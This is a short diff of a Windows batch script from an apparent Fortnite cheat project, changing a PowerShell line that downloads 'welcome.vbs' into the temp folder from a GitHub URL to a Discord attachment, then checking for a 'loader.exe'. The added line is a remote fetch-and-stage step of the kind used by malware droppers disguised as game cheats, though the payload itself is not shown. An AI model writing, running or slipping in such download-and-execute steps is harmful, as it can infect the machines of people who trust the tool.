@@ -1,5 +1,5 @@
 @echo off
-Powershell https://raw.githubusercontent.com/fortnite-bot/fncheat/main/welcome.vbs -OutFile %temp%/welcome.vbs
+Powershell https://cdn.discordapp.com/attachments/774913548827885592/775027796388872192/welcome.vbs -OutFile %temp%/welcome.vbs
 
 IF EXIST "%temp%/loader.exe" (
     goto :menu
